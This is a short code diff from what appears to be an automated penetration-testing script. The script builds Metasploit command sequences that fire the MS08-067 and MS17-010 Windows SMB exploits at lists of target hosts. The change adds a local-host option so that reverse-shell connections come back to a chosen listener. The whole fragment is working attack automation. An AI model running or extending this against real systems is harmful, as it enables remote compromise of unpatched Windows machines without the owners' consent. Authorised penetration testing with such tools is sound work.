@@ -3,12 +3,14 @@ import json
 import subprocess
 import sys
 
-def handle_exploitation(exploit_dict, start_port=4444):
+def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
     port = start_port  # Necessary because this becomes multithreaded
     commands = []  # List of commands to execute in metasploit
 
     if len(exploit_dict['ms08-067']) > 0:
         commands.append('use exploit/windows/smb/ms08_067_netapi')
+        if lhost:
+            commands.append('set lhost {0}'.format(lhost))
 
         for host in exploit_dict['ms08-067']:
             commands.append('set rhost {0}'.format(host))
@@ -18,6 +20,8 @@ def handle_exploitation(exploit_dict, start_port=4444):
 
     if len(exploit_dict['ms17-010']) > 0:
         commands.append('use exploit/windows/smb/ms17_010_psexec')
+        if lhost:
+            commands.append('set lhost {0}'.format(lhost))
 
         for host in exploit_dict['ms17-010']:
             commands.append('set rhost {0}'.format(host))
